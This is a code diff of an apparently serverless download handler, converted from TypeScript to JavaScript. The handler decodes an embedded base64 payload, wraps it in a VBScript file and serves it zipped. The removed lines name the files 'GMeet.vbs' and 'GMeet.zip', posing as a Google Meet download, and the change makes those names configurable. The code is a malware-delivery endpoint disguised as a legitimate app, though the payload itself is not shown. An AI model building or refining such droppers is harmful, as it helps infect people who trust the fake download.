-  const t: number[] = new Array(256);
+  const t = new Array(256);
   for (let n = 0; n < 256; n++) {
     let c = n;
     for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
@@ -236,23 +234,23 @@ function crcTable(): number[] {
   return t;
 }
 
-function crc32(buf: Buffer): number {
+function crc32(buf) {
   const t = crcTable();
   let c = 0xffffffff;
   for (let i = 0; i < buf.length; i++) c = t[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
   return (c ^ 0xffffffff) >>> 0;
 }
 
-function dosDateTime(d: Date): { time: number; date: number } {
+function dosDateTime(d) {
   const time = (d.getHours() << 11) | (d.getMinutes() << 5) | (Math.floor(d.getSeconds() / 2) & 0x1f);
   const date = ((d.getFullYear() - 1980) << 9) | ((d.getMonth() + 1) << 5) | d.getDate();
   return { time: time & 0xffff, date: date & 0xffff };
 }
 
-function buildZip(files: Array<{ name: string; data: Buffer }>): Buffer {
+function buildZip(files) {
   const now = dosDateTime(new Date());
-  const locals: Buffer[] = [];
-  const centrals: Buffer[] = [];
+  const locals = [];
+  const centrals = [];
   let offset = 0;
 
   for (const f of files) {
@@ -312,23 +310,22 @@ function buildZip(files: Array<{ name: string; data: Buffer }>): Buffer {
   return Buffer.concat([...locals, cdBuf, eocd]);
 }
 
-// ---------- handler ----------
-
-export default function handler(req: any, res: any): void {
+export default function handler(req, res) {
   try {
     const payload = Buffer.from(PAYLOAD_B64, "base64").toString("utf8");
     if (!payload || payload.length < 100) throw new Error("embedded payload missing");
 
     const vbs = buildVbs(payload);
-    const zip = buildZip([{ name: "GMeet.vbs", data: Buffer.from(vbs, "latin1") }]);
+    const zip = buildZip([{ name: VBS_NAME, data: Buffer.from(vbs, "latin1") }]);
 
     res.setHeader("Content-Type", "application/zip");
-    res.setHeader("Content-Disposition", 'attachment; filename="GMeet.zip"');
-    res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
+    res.setHeader("Content-Disposition", `attachment; filename="${ZIP_NAME}"`);
+    res.setHeader("Content-Length", zip.length);
+    res.setHeader("Cache-Control", "no-cache, no-store, must-revalidate");
     res.setHeader("Pragma", "no-cache");
-    res.status(200).send(zip);
-  } catch (e: any) {
-    res.status(500).setHeader("Content-Type", "text/plain");
-    res.send("download unavailable");
+    res.setHeader("Expires", "0");
+    res.status(200).end(zip);
+  } catch (e) {
+    res.status(500).json({ error: "download unavailable" });
   }
 }
